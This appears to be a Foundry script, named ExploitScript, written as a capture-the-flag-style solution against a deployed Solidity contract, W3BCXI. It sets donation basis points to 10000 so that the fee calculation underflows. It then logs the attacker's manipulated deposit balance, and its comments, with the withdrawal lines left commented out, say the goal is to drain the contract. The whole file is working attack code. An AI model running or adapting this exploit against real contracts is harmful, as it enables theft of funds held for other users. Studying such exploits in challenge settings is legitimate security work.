// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/W3BCXI.sol";

contract ExploitScript is Script {
    W3BCXI public target;
    address payable public attacker;
    
    function setUp() public {
        // Connect to the already deployed contract
        target = W3BCXI(payable(address(0xE7539Ffed4b4018bD6EA15fc742586C18E52438f))); // Replace with actual contract address
        
        // Set up attacker account with your private key
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        attacker = payable(vm.addr(privateKey));
    }

    function run() public {
        vm.startBroadcast();
        
        // Calculate overflow donation basis points
        // We need fee > msg.value to trigger underflow
        // Current fee is 3141 basis points
        uint256 donationBps = 10000;
        
        // Execute exploit
        target.deposit{value: 1}(attacker, donationBps);
        
        // Log manipulated balance
        uint256 balance = target.viewDeposit(attacker);
        console.log("Attacker's manipulated deposit:", balance);
        
        // Withdraw everything
        // target.rescueFunds();
        
        // Verify success
        // require(target.drained(), "Contract not drained");
        // console.log("Contract successfully drained!");
        console.log("Attacker's ETH balance:", attacker.balance);
        // console.log("Target's ETH balance:", target);
        
        vm.stopBroadcast();
    }
}